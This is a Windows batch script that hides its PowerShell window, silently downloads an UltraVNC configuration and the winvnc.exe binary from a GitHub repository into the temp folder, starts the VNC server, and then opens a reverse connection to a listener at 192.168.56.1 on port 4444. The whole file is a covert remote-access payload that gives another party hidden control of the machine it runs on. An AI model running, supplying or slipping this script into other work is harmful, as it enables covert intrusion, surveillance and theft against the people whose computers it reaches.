@echo off
powershell -w hidden "cmd /c
cd %temp%
curl -s https://raw.githubusercontent.com/DBlack7/Bean/refs/heads/main/UltraVNC.ini --output UltraVNC.ini
curl -s https://raw.githubusercontent.com/DBlack7/Bean/main/winvnc.exe --output winvnc.exe
timeout /t 1 >nul
start winvnc.exe -run
timeout /t 1 
start winvnc.exe -connect 192.168.56.1::4444
"
exit